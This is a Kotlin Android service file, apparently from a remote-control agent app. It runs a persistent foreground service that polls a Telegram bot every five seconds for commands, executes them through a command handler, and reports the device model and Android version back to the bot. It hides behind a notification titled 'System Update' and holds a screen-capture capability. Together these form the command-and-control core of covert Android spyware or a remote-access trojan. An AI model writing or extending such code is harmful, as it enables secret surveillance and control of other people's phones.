package com.example.agent

import android.app.*
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import com.example.agent.ErrorReporter
import com.example.agent.EncryptedConfig
import java.util.concurrent.atomic.AtomicBoolean

class AgentService : Service() {

    private lateinit var telegram: TelegramClient
    private lateinit var handler: CommandHandler
    private val running = AtomicBoolean(false)

    override fun onCreate() {
        super.onCreate()

        // Initialize encrypted config and get credentials
        val config = EncryptedConfig.getInstance(this)
        val botToken = config.getBotToken()
        val chatId = config.getChatId()

        telegram = TelegramClient(botToken, chatId)
        ErrorReporter.init(this, telegram)
        handler = CommandHandler(this, telegram)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForeground()

        if (running.compareAndSet(false, true)) {
            Thread {
                try {
                    telegram.sendText(
                        "✅ Agent online\nDevice: ${android.os.Build.MODEL}\n" +
                        "Android: ${android.os.Build.VERSION.RELEASE}\nType /help for commands"
                    )
                } catch (e: Exception) { ErrorReporter.report(e, "AgentService") }

                while (running.get()) {
                    try {
                        telegram.getNewCommands().forEach { cmd ->
                            try {
                                telegram.sendText("⚙️ $cmd")
                                handler.handle(cmd)
                            } catch (e: Exception) { ErrorReporter.report(e, "AgentService") }
                        }
                    } catch (e: Exception) { ErrorReporter.report(e, "AgentService") }

                    try {
                        Thread.sleep(5_000)
                    } catch (e: InterruptedException) {
                        Thread.currentThread().interrupt()
                        break
                    }
                }
            }.start()
        }

        return START_STICKY
    }

    private fun startForeground() {
        val channelId = "agent_channel"
        val channel = NotificationChannel(
            channelId, "System Update", NotificationManager.IMPORTANCE_LOW
        ).apply {
            description = "System service"
            setShowBadge(false)
        }
        val nm = getSystemService(NotificationManager::class.java)
        nm.createNotificationChannel(channel)

        startForeground(1,
            NotificationCompat.Builder(this, channelId)
                .setContentTitle("System Update")
                .setContentText("roaming is active only")
                .setSmallIcon(android.R.drawable.stat_notify_sync)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setCategory(NotificationCompat.CATEGORY_SERVICE)
                .setOngoing(true)
                .build()
        )
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        running.set(false)
        (application as? AgentApplication)?.screenCapability?.release()
        super.onDestroy()
    }
}
